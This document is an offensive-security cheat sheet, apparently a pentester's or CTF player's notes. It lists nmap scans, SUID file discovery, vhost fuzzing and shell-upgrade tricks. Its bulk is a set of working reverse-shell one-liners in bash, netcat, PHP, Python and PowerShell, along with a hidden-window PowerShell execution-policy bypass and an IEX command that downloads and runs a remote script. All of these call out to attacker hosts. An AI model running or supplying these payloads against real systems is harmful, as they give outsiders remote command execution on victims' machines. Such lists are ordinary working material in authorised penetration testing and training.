wzNmap
1. `nmap -sVC -p- -v -T4 -sT --open IP_ADDRESS -oN results`
2. `sudo nmap -sU -p 1-1024 -v IP_ADDRESS -oA results_UDP`

Reverse shell
1. ` bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' ` - the `&` needs to be encoded if sending over URL
2. `echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.49/4444 0>&1' > rev.sh`
3. `nc -e /bin/bash [YOUR_IP] 4444`
4. ` nc -nv KALIIP PORT -e /bin/bash `
5. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f`
6. `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>`
7. ` echo -e '#!/bin/bash\n\nnc -e /bin/bash 10.10.14.77 4444' >> revshell `
8. ` echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.77/4444 0>&1' >> revshell `
9. ` python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
10. ` $callback = New-Object System.Net.Sockets.TCPClient("10.10.14.47",4444);$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close(); `
11. ` powershell \"IEX(New-Object Net.WebClient).downloadString('http://10.10.14.46/powershellrev.ps1')\" ` - download reverse shell script and run
12. ` psexec.py 'user:password@RHOST' ` - Windows shell with `impacket`
13. ` powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$client = New-Object System.Net.Sockets.TCPClient('192.168.45.160',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\" ` - another PowerShell 1 liner that can be run from `cmd`

Upgrade shell
1. `python3 -c 'import pty; pty.spawn("/bin/bash")' `
2. ` stty raw -echo; fg `, then ` reset `, `screen`, ` export TERM=screen `
3. ` stty erase ^h ` (if the backspace is not working)
4. ` script /dev/null -c bash `
5. ` socat file:tty,raw,echo=0 tcp-listen:5555 ` - start `socat` listener, ` socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.77:5555 ` on victim machine
6. https://zweilosec.github.io/posts/upgrade-windows-shell/
7. ` socat TCP4-LISTEN:$port,fork STDOUT ` on attacker machine, then `socat.exe TCP4:$ip:$port EXEC:'cmd.exe',pipes` on victim machine
8. Run `nc` with `rlwrap` for Windows

Linux find SUID files
1. `find / -type f -perm -04000 -ls 2>/dev/null`

VHOST Enumeration
1. ` ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://example.com/ -H "Host: FUZZ.example.com" -mc all -fw <> `